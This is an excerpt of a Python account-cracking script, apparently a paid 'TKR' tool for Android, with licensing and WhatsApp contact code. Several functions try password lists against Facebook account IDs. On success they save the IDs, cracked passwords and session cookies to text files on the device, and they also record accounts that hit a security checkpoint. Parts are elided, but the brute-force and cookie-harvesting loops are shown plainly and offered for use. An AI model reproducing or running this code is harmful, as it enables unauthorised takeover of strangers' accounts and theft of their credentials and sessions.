...
os.system('xdg-open https://chat.whatsapp.com/G4E39Duw1ngFbeTYLAOSJd')
print('\n\033[1;37m[-] CHECKING UPDATE')
def getKey():
    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","TKR").replace("u","9").replace("a","A")
...
----------------------------------------------
\033[1;37m[+] Author       :       Tahir Ali Khosa
\033[1;37m[+] Github       :       Unknown 
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                wx=('G4E39Duw1ngFbeTYLAOSJd')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system("xdg-open wa.me/+923227508149")               
                        elif xd in ['0','00']:
                                exit(' THANKS FOR USE TKR TOOL ')
                        else:
                                exit(' Select valid option .')                
                else:
                        print("\033[1;32m TKR SERVER IS OFF")
...
def za():
    ...
    if myid in str(body):
        ...
        tks = ("Hi Tahir BRO I WANT TO BUY YOUR PAID TOOL V 7.2 PLEASE ACCEPT MY KEY FOR PREMIUM \nMy name : "+name+" \nMy Key : "+myid)
        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
        print("\033[1;37m run again python TKR.py")
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TKR-M1] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [TKR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TKR_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TKR_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/TKR-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [TKR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TKR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TKR-M2] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TKR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TKR_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TKR_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              #  open('/sdcard/TKR-M2-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def graph(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TKR-M3] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TKR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TKR_OK_ids_M3.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TKR_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               # open('/sdcard/TKR-M3-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def graph1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TKR-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TKR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TKR_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TKR_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/TKR-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TKRbrand] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [TKR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TKR-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [TKR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TKR-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
